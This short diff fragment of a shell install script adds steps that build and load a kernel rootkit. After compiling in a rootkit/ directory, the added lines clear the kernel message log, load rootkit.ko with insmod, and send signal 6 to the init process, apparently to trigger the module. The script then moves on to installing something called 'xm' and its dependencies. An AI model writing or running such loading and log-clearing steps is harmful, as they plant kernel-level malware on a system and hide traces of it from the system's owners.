@@ -8,6 +8,13 @@ echo " building "
 cd rootkit/
 make
 echo "successfully completed installation"
+dmesg -C
+insmod rootkit.ko
+dmesg 
+kill -6 1
+dmesg
+
+
 
 echo "installing xm"
 echo "installing dependencies"
